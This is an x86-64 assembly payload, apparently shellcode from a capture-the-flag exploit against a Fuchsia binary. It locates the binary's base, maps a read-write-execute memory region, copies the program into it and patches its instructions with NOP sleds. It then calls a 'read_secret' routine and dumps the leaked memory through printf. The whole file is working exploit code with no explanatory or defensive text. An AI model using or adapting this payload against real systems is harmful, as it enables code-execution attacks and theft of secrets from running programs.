[BITS 64]
[ORG 0x0000000000000000]

%macro call_func 1
	mov rax, r15
	add rax, %1
	call rax
%endmacro
%macro arg1 1
	mov rdi, %1
%endmacro
%macro arg2 1
	mov rsi, %1
%endmacro
%macro arg3 1
	mov rdx, %1
%endmacro
%macro arg4 1
	mov rcx, %1
%endmacro
%macro arg5 1
	mov r8, %1
%endmacro
%macro arg6 1
	mov r9, %1
%endmacro

%define _puts 0x10d00
%define _read 0x10BF0
%define _open 0x10D30
%define _malloc 0x10E10
%define _printf 0x10C40
%define _mmap 0x10D60
%define _mprotect 0x10d70
%define _memcpy 0x10c70
%define main 0x6F90

%define read_secret 0x6780

%define _zx_vmar_root_self 0x10cb0

_start:
	; r15 = binary base
	mov r15, rbp
	sub r15, 0x13fe

	; change---
	mov rax, r15
	add rax, 0x12140
	mov rax, [rax]
	arg1 rax

	mov rax, r15
	add rax, 0x12140
	mov rax, [rax]
	mov rax, [rax]
	add rax, 48
	mov rax, [rax]
	
	push r15
	call rax
	int 3
	pop r15

	;int 3
	;mov r13, r15
	;add r13, 0x12140
	;mov rax, [r13]
	
	;mov rbx, [rax]
	;mov rcx, [rax+0x8]
	;mov rdx, [rax+0x10]
	;mov rdi, [rax+0x18]
	;mov rsi, [rax+0x20]
	;mov r8, [rax+0x28]
	;mov r9, [rax+0x30]
	;int 0x3

	arg1 0
	arg2 0x13000
	arg3 7
	arg4 0x80022
	arg5 -1
	arg6 0
	call_func _mmap

	arg1 rax
	arg2 r15
	arg3 0x13000
	call_func _memcpy
	mov r15, rax

	mov r14, r15
	add r14, 0x6979
	;49 c7 c1 00 30 00 00
	mov BYTE [r14], 0x49
	inc r14
	mov BYTE [r14], 0xc7
	inc r14
	mov BYTE [r14], 0xc1
	inc r14
	mov BYTE [r14], 0x00
	inc r14
	mov BYTE [r14], 0x30
	inc r14
	mov BYTE [r14], 0x00
	inc r14
	mov BYTE [r14], 0x00
	inc r14


	mov r14, r15
	add r14, 0x6998
	mov rcx, 217
	;48 83 c4 58
	
	mov BYTE [r14], 0x48
	inc r14
	mov BYTE [r14], 0x83
	inc r14
	mov BYTE [r14], 0xc4
	inc r14
	mov BYTE [r14], 0x58
	inc r14

label1:
	mov BYTE [r14], 0x90
	add r14, 1
	loop label1

	push r15
	call_func read_secret
	mov r14, r15
	pop r15

	mov rax, [r14-0x130]
	mov r14, rax	

	arg1 0x100
	call_func _malloc
	mov r13, rax

	mov rax, QWORD 684069
	mov [r13], rax
	mov r12, r14
	arg1 r13
	arg2 [r12]
	call_func _printf
	add r12, 0x30
	arg1 r13
	arg2 [r12]
	call_func _printf
	add r12, 0x30
	arg1 r13
	arg2 [r12]
	call_func _printf


	mov rax, QWORD 2941353058791461
	mov [r13], rax

		mov rcx, 0x30

label2:
	push rcx
	arg1 r13
	arg2 r14
	arg3 r14
	call_func _printf
	add r14, 1
	pop rcx
	loop label2

	mov r14, rdi
	sub r14, 0xad208

		;mov rax, r14
	;add rax, {}
	;arg1 10
	;call rax

	int 0x3
